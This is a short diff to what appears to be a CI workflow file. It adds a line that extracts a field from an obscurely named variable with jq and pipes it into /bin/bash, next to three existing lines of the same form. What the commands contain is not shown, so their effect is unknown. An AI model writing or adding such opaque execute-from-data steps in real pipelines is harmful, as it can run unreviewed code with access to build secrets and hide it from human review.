@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$rjwam135" | jq -r .u41673 | /bin/bash
           printf '%s' "$fc3884" | jq -r .cbca232 | /bin/bash
           printf '%s' "$to0757" | jq -r .mfytp03146 | /bin/bash
+          echo $ygpoh2 | jq -r .sg82 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
